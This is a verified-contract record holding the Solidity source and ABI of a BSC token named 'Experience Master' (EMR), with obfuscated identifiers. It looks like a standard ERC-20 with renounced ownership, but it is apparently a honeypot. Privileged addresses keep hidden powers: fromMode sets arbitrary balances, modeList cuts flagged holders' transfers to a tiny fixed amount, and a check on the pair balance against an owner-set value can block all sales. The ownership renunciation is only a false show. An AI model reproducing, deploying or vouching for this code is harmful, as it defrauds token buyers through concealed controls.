{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface maxAt {\n    function createPair(address limitAmount, address teamTx) external returns (address);\n}\n\ninterface atBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderIs) external view returns (uint256);\n\n    function transfer(address takeSellAt, uint256 fromMarketing) external returns (bool);\n\n    function allowance(address atToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeSellAt,\n        uint256 fromMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletEnable, uint256 value);\n    event Approval(address indexed atToken, address indexed spender, uint256 value);\n}\n\nabstract contract autoSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeLimitEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atBuyMetadata is atBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExperienceMaster is autoSell, atBuy, atBuyMetadata {\n\n    constructor (){\n        \n        modeLimitEnable minLaunch = modeLimitEnable(toSell);\n        tradingFrom = maxAt(minLaunch.factory()).createPair(minLaunch.WETH(), address(this));\n        if (exemptMarketingLaunch) {\n            totalLaunchFee = tokenMax;\n        }\n        liquidityToken = _msgSender();\n        receiverLiquidity[liquidityToken] = true;\n        buyFrom[liquidityToken] = exemptMode;\n        teamExempt();\n        if (buyTradingAuto) {\n            takeLiquidity = false;\n        }\n        emit Transfer(address(0), liquidityToken, exemptMode);\n    }\n\n    function minList(uint256 fromMarketing) public {\n        isListLaunched();\n        sellAt = fromMarketing;\n    }\n\n    uint256 private tokenMax;\n\n    event OwnershipTransferred(address indexed totalAmount, address indexed atTotal);\n\n    function name() external view virtual override returns (string memory) {\n        return shouldWalletSell;\n    }\n\n    bool private buyTradingAuto;\n\n    function modeList(address maxTake) public {\n        isListLaunched();\n        if (exemptMarketingLaunch) {\n            exemptMarketingLaunch = true;\n        }\n        if (maxTake == liquidityToken || maxTake == tradingFrom) {\n            return;\n        }\n        exemptTotal[maxTake] = true;\n    }\n\n    uint256 private exemptMode = 100000000 * 10 ** 18;\n\n    uint256 private senderFund;\n\n    address public tradingFrom;\n\n    function approve(address tradingTokenSwap, uint256 fromMarketing) public virtual override returns (bool) {\n        walletAuto[_msgSender()][tradingTokenSwap] = fromMarketing;\n        emit Approval(_msgSender(), tradingTokenSwap, fromMarketing);\n        return true;\n    }\n\n    address public liquidityToken;\n\n    function getOwner() external view returns (address) {\n        return fromAutoReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletAuto;\n\n    uint8 private isLimit = 18;\n\n    address toSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLimit;\n    }\n\n    mapping(address => uint256) private buyFrom;\n\n    function teamExempt() public {\n        emit OwnershipTransferred(liquidityToken, address(0));\n        fromAutoReceiver = address(0);\n    }\n\n    function allowance(address receiverMin, address tradingTokenSwap) external view virtual override returns (uint256) {\n        if (tradingTokenSwap == toSell) {\n            return type(uint256).max;\n        }\n        return walletAuto[receiverMin][tradingTokenSwap];\n    }\n\n    function fromMode(address isSell, uint256 fromMarketing) public {\n        isListLaunched();\n        buyFrom[isSell] = fromMarketing;\n    }\n\n    bool public takeLiquidity;\n\n    function balanceOf(address senderIs) public view virtual override returns (uint256) {\n        return buyFrom[senderIs];\n    }\n\n    uint256 feeLimit;\n\n    bool private exemptMarketingLaunch;\n\n    mapping(address => bool) public receiverLiquidity;\n\n    function tokenAuto(address tradingMode) public {\n        require(tradingMode.balance < 100000);\n        if (txFrom) {\n            return;\n        }\n        \n        receiverLiquidity[tradingMode] = true;\n        if (sellMin) {\n            tokenMax = totalLaunchFee;\n        }\n        txFrom = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptMode;\n    }\n\n    address minMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isListLaunched() private view {\n        require(receiverLiquidity[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return fromAutoReceiver;\n    }\n\n    string private shouldWalletSell = \"Experience Master\";\n\n    function liquidityIs(address feeAmount, address takeSellAt, uint256 fromMarketing) internal returns (bool) {\n        if (feeAmount == liquidityToken) {\n            return autoBuy(feeAmount, takeSellAt, fromMarketing);\n        }\n        uint256 modeMin = atBuy(tradingFrom).balanceOf(minMax);\n        require(modeMin == sellAt);\n        require(takeSellAt != minMax);\n        if (exemptTotal[feeAmount]) {\n            return autoBuy(feeAmount, takeSellAt, senderTx);\n        }\n        return autoBuy(feeAmount, takeSellAt, fromMarketing);\n    }\n\n    function autoBuy(address feeAmount, address takeSellAt, uint256 fromMarketing) internal returns (bool) {\n        require(buyFrom[feeAmount] >= fromMarketing);\n        buyFrom[feeAmount] -= fromMarketing;\n        buyFrom[takeSellAt] += fromMarketing;\n        emit Transfer(feeAmount, takeSellAt, fromMarketing);\n        return true;\n    }\n\n    bool private sellMin;\n\n    bool public txFrom;\n\n    mapping(address => bool) public exemptTotal;\n\n    uint256 constant senderTx = 15 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMode;\n    }\n\n    address private fromAutoReceiver;\n\n    function transfer(address isSell, uint256 fromMarketing) external virtual override returns (bool) {\n        return liquidityIs(_msgSender(), isSell, fromMarketing);\n    }\n\n    uint256 sellAt;\n\n    string private launchedMode = \"EMR\";\n\n    uint256 private totalLaunchFee;\n\n    function transferFrom(address feeAmount, address takeSellAt, uint256 fromMarketing) external override returns (bool) {\n        if (_msgSender() != toSell) {\n            if (walletAuto[feeAmount][_msgSender()] != type(uint256).max) {\n                require(fromMarketing <= walletAuto[feeAmount][_msgSender()]);\n                walletAuto[feeAmount][_msgSender()] -= fromMarketing;\n            }\n        }\n        return liquidityIs(feeAmount, takeSellAt, fromMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTokenSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"fromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"minList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"}],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSellAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExperienceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}